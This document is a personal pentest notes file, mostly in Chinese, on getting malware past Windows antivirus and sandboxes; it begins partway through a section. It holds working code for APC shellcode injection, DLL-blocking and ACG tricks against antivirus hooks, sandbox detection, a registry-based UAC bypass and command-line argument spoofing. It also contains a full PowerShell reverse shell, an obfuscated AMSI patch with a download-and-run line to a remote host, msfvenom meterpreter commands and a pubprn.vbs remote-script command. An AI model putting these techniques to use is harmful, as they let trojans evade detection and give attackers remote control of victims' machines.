```c#
string strShellCode = "[INSERT BASE64 SHELLCODE HERE]";
byte[] shellcode = System.Convert.FromBase64String(strShellCode);

STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
bool success = CreateProcess(processpath, null, 
						IntPtr.Zero, IntPtr.Zero, false, 
						ProcessCreationFlags.CREATE_SUSPENDED, 
						IntPtr.Zero, null, ref si, out pi);
						

IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_READWRITE);
IntPtr bytesWritten = IntPtr.Zero;
bool resultBool = WriteProcessMemory(pi.hProcess,resultPtr,shellcode,shellcode.Length, out bytesWritten);
	
IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
uint oldProtect = 0;
resultBool = VirtualProtectEx(pi.hProcess,resultPtr, shellcode.Length,PAGE_EXECUTE_READ, out oldProtect);
IntPtr ptr = QueueUserAPC(resultPtr,sht,IntPtr.Zero);
IntPtr ThreadHandle = pi.hThread;
ResumeThread(ThreadHandle);
```

### Block DLL(Create New Process)
https://www.anquanke.com/post/id/190344

![-w979](https://i.loli.net/2021/01/18/q1lZIm74SnvpAjO.jpg)
https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute

![](https://i.loli.net/2021/01/18/CByOAzWKlPJvUhV.jpg)
![](https://i.loli.net/2021/01/18/2UzRX1nflDeWtHF.jpg)


`/Users/boi/Documents/Work/Security/Pentest/bypassAV/blockdll_ACG/`
```c
STARTUPINFOEXA si;
PROCESS_INFORMATION pi;
policy.ProhibitDynamicCode = 1;

ZeroMemory(&si, sizeof(si));
si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;

// Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
InitializeProcThreadAttributeList(NULL, 1, 0, &size);

// Allocate memory for PROC_THREAD_ATTRIBUTE_LIST
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
	GetProcessHeap(),
	0,
	size
);

// Initialise our list 
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);

// Enable blocking of non-Microsoft signed DLLs
DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

// Assign our attribute
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
```

### ACG(Arbitrary Code Guard)
阻止杀软进程hook我们的进程后在进程内部使用VirtualAlloc等函数修改内存空间
使其无法生成动态代码或修改现有的可执行代码.

![-w1500](https://i.loli.net/2021/01/18/3Er1jPwRuSTfKoi.jpg)


```c
PROCESS_MITIGATION_DYNAMIC_CODE_POLICY acg_policy;
ZeroMemory(&acg_policy, sizeof(acg_policy));
acg_policy.ProhibitDynamicCode = 1;
if (SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &acg_policy, sizeof(acg_policy)) == false) {
	MessageBoxA(NULL, "load testdll.dll error.", "error", MB_OK);
	return 1;
}
```

### 内存动态加载DLL
https://github.com/fancycode/MemoryModule



## 虚拟机反调试
那么问题来了，如何对抗云沙箱的检测呢？我们知道，很多杀软都有自己的后端云沙箱，这些沙箱能够模拟出软件执行所需的运行环境，通过进程hook技术来对软件执行过程中的行为进行分析，判断其是否有敏感的操作行为，或者更高级的检测手法是，将获取到的程序的API调用序列以及其他的一些行为特征输入到智能分析引擎中（基于机器学习org）进行检测。所以，如果我们的木马没有做好反调试，很容易就被沙箱检测出来。

最简单的反调试的措施就是检测父进程。一般来说，我们手动点击执行的程序的父进程都是explore。如果一个程序的父进程不是explor，那么我们就可以认为他是由沙箱启动的。那么我们就直接exit退出，这样，杀软就无法继续对我们进行行为分析了。具体的实现代码如下：

```c
DWORD get_parent_processid( DWORD pid )
{
	DWORD ParentProcessID = -1;

	PROCESSENTRY32 pe;

	HANDLE hkz;

	HMODULE hModule = LoadLibrary( _T( "Kernel32.dll" ) );

	FARPROC Address = GetProcAddress( hModule, "CreateToolhelp32Snapshot" );

	if ( Address == NULL ){
		OutputDebugString( _T( "GetProc error" ) );
		return(-1);
	}

	_asm{
		push 0
		push 2
		call Address
		mov hkz, eax
	}

	pe.dwSize = sizeof(PROCESSENTRY32);

	if ( Process32First( hkz, &pe ) ){
		do{
			if ( pe.th32ProcessID == pid ){
                ParentProcessID = pe.th32ParentProcessID;
				break;
			}
		}
		while ( Process32Next( hkz, &pe ) );
	}
	returnParentProcessID;
}


DWORD get_explorer_processid(){
	DWORD explorer_id = -1;
	PROCESSENTRY32 pe;
	HANDLE hkz;
	HMODULE hModule = LoadLibrary( _T( "Kernel32.dll" ) );

	if ( hModule == NULL ){
		OutputDebugString( _T( "Loaddll error" ) );
		return(-1);
	}
	FARPROCAddress = GetProcAddress( hModule, "CreateToolhelp32Snapshot" );

	if ( Address == NULL ){
		OutputDebugString( _T( "GetProc error" ) );
		return(-1);
	}

	_asm{
		push0
		push2
		callAddress
			movhkz, eax
	}

	pe.dwSize = sizeof(PROCESSENTRY32);

	if ( Process32First( hkz, &pe ) ){
		do{
			if ( _stricmp( pe.szExeFile, "explorer.exe" ) == 0 )
			{
				explorer_id = pe.th32ProcessID;
				break;
			}
		}
		while ( Process32Next( hkz, &pe ) );
	}
	returnexplorer_id;
}


void domain(){
	DWORD explorer_id	= get_explorer_processid();
	DWORD parent_id		= get_parent_processid( GetCurrentProcessId() );
	if ( explorer_id == parent_id ){ /* 判断父进程id是否和explorer进程id相同{ */
		dowork();
    }
    else  {
	exit( 1 );
    }
}
```

这里主要的思路是获取调用kernel32库中的CreateToolhelp32Snapshot函数获得一个进程快照信息，然后从快照中获取到explorer.exe的进程id信息，然后通过当前进程的pid信息在进程快照中找到其父进程的id信息，最后将两者进行比较，判断当前进程是否是有人工启动的。

反调试的措施不仅仅是检测父进程，还可以通过调用windows的API接口IsDebuggerPresent来检查当前进程是否正在被调试。

TODO： 检测反调试的话，还可以通过检查进程堆的标识符号来实现，系统创建进程时会将Flags置为0×02（HEAP_GROWABLE），将ForceFlags置为0。但是进程被调试时，这两个标志通常被设置为0x50000062h和0x40000060h。当然还可以利用特权指令in eax,dx来做免杀。

## UAC
### visual Studio下设置UAC需求
![-w922](https://i.loli.net/2021/01/18/XNOJmQn84xAfU6j.jpg)/Users/boi/Desktop/特征信息/md


### CompyterDefaults.exe
注意在unicode环境下，需要通过`(PBYTE)&`来转换`CHAR *`类型的字符串。
以及GetModuleFileNameA与GetModuleFileName的区别：字符串编码的区别
```c
//bypass UAC 高权限启动当前进程
//GetModuleFileNameA: 获取当前文件完整路径
#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE
#define _CRT_SECURE_NO_WARNINGS

CHAR cwd[256];
GetModuleFileNameA(NULL, cwd, sizeof(cwd));//"cmd.exe"
LPCTSTR gname = "DelegateExecute";
HKEY hkResult = NULL;
int ret = RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", &hkResult);
ret = RegSetValueExA(hkResult, (const BYTE*)"DelegateExecute", 0, REG_SZ, "", 1);
ret = RegSetValueExA(hkResult, NULL, 0, REG_SZ, (PBYTE)&cwd, strlen(cwd) + 1);
RegCloseKey(hkResult);
system("C:\\windows\\system32\\ComputerDefaults.exe");
exit(1);
```

## Other

### C# 函数变换
[https://github.com/DamonMohammadbagher/NativePayload_Reverse_tcp]()

```c#
public static UInt32 funcAddr;
[DllImport("kernel32")]
public static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


public delegate UInt32 V(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

V v = Hide.code.b._classs.VirtualAlloc;

Hide.code.b.funcAddr = v(0, (UInt32)Hide.code.a.ftp.Length, Hide.hide2.hide3.MMC, Hide.hide2.hide3.PERE);
        
```



### go 内联免杀
360 + 火绒
```c
package main
/*
void call(char *code) {
int (*ret)() = (int(*)())code;
ret(); }
*/
import "C"
import "unsafe"
func main() {
buf := "cobaltstrike python shellcode(x86/x64)"
shellcode := []byte(buf)
C.call((*C.char)(unsafe.Pointer(&shellcode[0]))) }
```

### AVIator
360 + 火绒
``` 
https://github.com/Ch0pin/AVIator
```
[AvIator360](media/AvIator360.exe)

### cs + veil 
360 + 火绒
![-w377](https://i.loli.net/2021/01/18/LnvS6cHEbAgpDXO.jpg)


```bash
cs -> veil -> use 1 -> use 17 -> generate(bypass 360/火绒)
sh-4.4# veil
Veil>: use 1
Veil/Evasion>: use 17 //如下图
```
![-w767](https://i.loli.net/2021/01/18/QvVYamudNPxXLMq.jpg)

```
BADMACS 设置为Y表示 查看运行环境的MAC地址如果不是虚拟机才会执行payload （反调试）
CLICKTRACK 设置为4表示 表示需要4次点击才会执行
CURSORCHECK 设置为100表示 运行环境的硬盘大小如果大于100GB才会执行payload （反沙箱）
COMPILE_TO_EXE 设置为Y表示 编译为exe文件
HOSTNAME 设置为Comp1表示 只有在Hostname计算机名为Comp1时才会执行payload（指定目标环境 反沙箱的方式）
INJECT_METHOD 可设置为Virtual 或 Heap
MINPROCS 设置为20表示 只有运行环境的运行进程数大于20时才会执行payload（指定目标环境 反沙箱的方式）
PROCCHECK 设置为Y表示 只有运行环境的进程中没有虚拟机进程时才会执行payload（指定目标环境 反沙箱的方式）
PROCESSORS 设置为2表示 只在至少2核的机器中才会执行payload（指定目标环境 反沙箱的方式）
RAMCHECK 设置为Y表示 只在运行环境的内存为3G以上时才会执行payload（指定目标环境 反沙箱的方式）
SLEEP 设置为10表示 休眠10秒 以检测是否运行过程中被加速（反沙箱）
USERNAME 设置为Tom表示 只有在当前用户名为Tom的机器中才执行payload。
USERPROMPT 设置为Y表示 在injection之前提醒用户（提示一个错误框，让用户误以为该程序执行错误才无法打开）
DEBUGGER 设置为Y表示 当被调试器不被attached时才会执行payload （反调试）
DOMAIN 设置为Comp表示 受害者计算机只有加入Comp域中时，才会执行payload（指定目标环境 反沙箱的方式）
UTCCHECK 设置为Y表示 只在运行环境的系统使用UTC时间时，才会执行payload
```
```bash
[go/shellcode_inject/virtual>>]: generate
>> 3
```
![-w770](https://i.loli.net/2021/01/18/36BGibxXYslznAR.jpg)

```bash
[>] Please enter the base name for output files (default is payload): test
```
![-w667](https://i.loli.net/2021/01/18/igfI2YRDubzU9ph.jpg)

### Simple-Loader 免杀Defender
https://github.com/cribdragg3r/Simple-Loader

![-w1027](https://i.loli.net/2021/01/18/dSBPvIxk8hXuFa5.jpg)

### 反弹socket --- NativePayload_ReverseShell
```powershell
powershell -c "$client = New-Object Net.Sockets.TCPClient('172.16.76.1',12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback +'> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

https://github.com/DamonMohammadbagher/NativePayload_ReverseShell
![-w1008](https://i.loli.net/2021/01/18/x45X8iUBmda2I1H.jpg)


### bypassAMSI
```powershell
# mov eax, 80070057h
# ret
Write-Host "-- AMSI Patch"
Write-Host "-- Paul Laîné (@am0nsec)"
Write-Host ""

${Kern`eL32} = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type ${Kern`el32}
[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
${A`DDRE`Ss} = [kernel32]::GetProcAddress($hModule, "Amsi"+"Scan"+"Buffer")
${p} = 0
[kernel32]::VirtualProtect(${A`DdRes`S}, [uint32]5,0x40, [ref]${P})
${pat`ch} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

If (${a`DDrEsS} -ne 0){
    [System.Runtime.InteropServices.Marshal]::Copy(${p`AT`cH}, 0, ${A`DdR`eSs}, 6)
}
# $string = 'iex ((new-object net.webclient).downloadstring("http://192.168.214.129/amsi-bypass")); if([Bypass.AMSI]::Disable() -eq "0") { iex ((new-object net.webclient).downloadstring("http://192.168.214.129/stager")) }'
```

### API替换
如CreateThreadEx 替换CreateThread

### Spoofing CommandLine Argument
https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/

```c
#include <iostream>
#include <windows.h>
#include <winternl.h>

#define CMD_TO_SHOW "powershell.exe -NoExit -c Write-Host 'This is just a friendly argument, nothing to see here'"
#define CMD_TO_EXEC L"powershell.exe -NoExit -c Write-Host Surprise, arguments spoofed\0"

typedef NTSTATUS(*NtQueryInformationProcess2)(
IN HANDLE,
IN PROCESSINFOCLASS,
OUT PVOID,
IN ULONG,
OUT PULONG
);

void* readProcessMemory(HANDLE process, void *address, DWORD bytes) {
SIZE_T bytesRead;
char *alloc;

alloc = (char *)malloc(bytes);
if (alloc == NULL) {
return NULL;
}

if (ReadProcessMemory(process, address, alloc, bytes, &bytesRead) == 0) {
free(alloc);
return NULL;
}

return alloc;
}

BOOL writeProcessMemory(HANDLE process, void *address, void *data, DWORD bytes) {
SIZE_T bytesWritten;

if (WriteProcessMemory(process, address, data, bytes, &bytesWritten) == 0) {
return false;
}

return true;
}

int main(int argc, char **canttrustthis)
{
STARTUPINFOA si;
PROCESS_INFORMATION pi;
CONTEXT context;
BOOL success;
PROCESS_BASIC_INFORMATION pbi;
DWORD retLen;
SIZE_T bytesRead;
PEB pebLocal;
RTL_USER_PROCESS_PARAMETERS *parameters;

printf("Argument Spoofing Example by @_xpn_\n\n");

memset(&si, 0, sizeof(si));
memset(&pi, 0, sizeof(pi));

// Start process suspended
success = CreateProcessA(
NULL, 
(LPSTR)CMD_TO_SHOW, 
NULL, 
NULL, 
FALSE, 
CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
NULL, 
"C:\\Windows\\System32\\", 
&si, 
&pi);

if (success == FALSE) {
printf("[!] Error: Could not call CreateProcess\n");
return 1;
}

// Retrieve information on PEB location in process
NtQueryInformationProcess2 ntpi = (NtQueryInformationProcess2)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
ntpi(
pi.hProcess, 
ProcessBasicInformation, 
&pbi, 
sizeof(pbi), 
&retLen
);

// Read the PEB from the target process
success = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
if (success == FALSE) {
printf("[!] Error: Could not call ReadProcessMemory to grab PEB\n");
return 1;
}

// Grab the ProcessParameters from PEB
parameters = (RTL_USER_PROCESS_PARAMETERS*)readProcessMemory(
pi.hProcess, 
pebLocal.ProcessParameters, 
sizeof(RTL_USER_PROCESS_PARAMETERS) + 300
);

// Set the actual arguments we are looking to use
WCHAR spoofed[] = CMD_TO_EXEC;
success = writeProcessMemory(pi.hProcess, parameters->CommandLine.Buffer, (void*)spoofed, sizeof(spoofed));
if (success == FALSE) {
printf("[!] Error: Could not call WriteProcessMemory to update commandline args\n");
return 1;
}

/////// Below we can see an example of truncated output in ProcessHacker and ProcessExplorer /////////

// Update the CommandLine length (Remember, UNICODE length here)
DWORD newUnicodeLen = 28;

success = writeProcessMemory(
pi.hProcess, 
(char *)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), 
(void*)&newUnicodeLen, 
4
);
if (success == FALSE) {
printf("[!] Error: Could not call WriteProcessMemory to update commandline arg length\n");
return 1;
}

// Resume thread execution*/
ResumeThread(pi.hThread);
}
```

### 签名伪造
Sigthief

### 修改资源文件
![](https://i.loli.net/2021/01/18/CrhNTg5xqXeysbM.jpg)

修改图标等资源文件的操作会改变文件的MD5,在某些情况下可以免杀一部分杀软,如360...
Restorator
Resource_Hacker

### MSF
```bash
1 、 msfvenom -p windows/meterpreter/reverse_http-e x86/shikata_ga_nai -i 15 -b '\x00' PrependMigrate=true PrependMigrateProc=svchost.exe LHOST=[your remote ip addres] LPORT=[listeningport] -f c >hacker.c

2 、 msfvenom -p windows/meterpreter/reverse_tcp-e x86/shikata_ga_nai -i 15 -b '\x00' PrependMigrate=true PrependMigrateProc=svchost.exe LHOST=[your remote ip addres]LPORT=[listening port] -f c >hacker.c

3 、 msfvenom -p windows/meterpreter/reverse_tcp_rc4 -e x86/shikata_ga_nai -i 15 -b '\x00' PrependMigrate=true PrependMigrateProc=svchost.exe LHOST=[your remote ip addres]LPORT=[listening port] -f c >hacker.c
```
`-e x86/shikata_ga_nai -i 15`是用`-e x86/shikata_ga_nai`编码15次，而`PrependMigrate=true PrependMigrateProc=svchost.exe`使这个程序默认会迁移到svchost.exe进程

另外使用 revers_tcp_rc4 可以对回话进行加密，对免杀有一定帮助

### pubprn.vbs*
```bash
cscript C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/api0cradle/fb164762143b1ff4042d9c662171a568/raw/709aff66095b7f60e5d6f456a5e42021a95ca802/test.sct
```

### 隐藏窗口
* wmain 创建窗口项目

* 命令参数
 ```c
 #pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup" )
 ```
* powershell 
```powershell
 Start-Process "C:`z\Windows\System32\cmd.exe" -Window Hidden
```
* C#
```c#
var handle = GetConsoleWindow();
ShowWindow(handle, SW_HIDE);
```

## 参考资料
https://ired.team/offensive-security/code-injection-process-injection/process-injection

https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87APC%E5%AE%9E%E7%8E%B0Dll%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87Sysmon%E7%9B%91%E6%8E%A7/

https://github.com/3gstudent/Inject-dll-by-APC/blob/master/test.cpp

https://github.com/wbenny/injdrv

https://github.com/DarthTon/Blackbone/blob/43bc59f68dc1e86347a76192ef3eadc0bf21af67/src/BlackBoneDrv/Loader.c （ring0 驱动）

https://xz.aliyun.com/t/4191

https://github.com/Veil-Framework/Veil

https://github.com/cribdragg3r/Simple-Loader

https://sevrosecurity.com/2019/05/25/bypass-windows-defender-with-a-simple-shell-loader/

https://j00ru.vexillium.org/syscalls/nt/64/

https://github.com/theevilbit/injection/blob/d166564e692d34c29620658a2102268bc9e640b1/InjectDLL/InjectDLL/InjectDLL.cpp

https://github.com/theevilbit/injection/blob/598e77b726925153079384114fa6f599a8b84995/SimpleThreadInjection/SimpleThreadInjection/SimpleThreadInjection.cpp

https://blog.xpnsec.com/

https://github.com/klionsec/BypassAV-AllThings

https://github.com/Techryptic/AV_Bypass

https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/blob/master/CH1/Bypassing%20Anti%20Viruses%20by%20C%23.NET%20Programming%20Chapter%201.pdf

https://github.com/Hackplayers/Salsa-tools

https://www.anquanke.com/post/id/190344

https://www.freebuf.com/column/135314.html

https://modexp.wordpress.com/2015/11/19/dllpic-injection-on-windows-from-wow64-process/

http://deniable.org/misc/inject-all-the-things

https://github.com/theevilbit/injection

https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html

https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87%E6%A8%A1%E6%8B%9F%E5%8F%AF%E4%BF%A1%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87UAC%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/

https://github.com/processhacker/processhacker/blob/master/phnt/include/ntpsapi.h

https://ired.team/offensive-security/defense-evasion/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon

https://ired.team/offensive-security/code-injection-process-injection/process-injection

https://github.com/stormshadow07/HackTheWorld

https://github.com/diegslva/BypassUA

https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://github.com/sailay1996/Fileless_UAC_bypass_WSReset

https://www.activecyber.us/activelabs/windows-uac-bypass
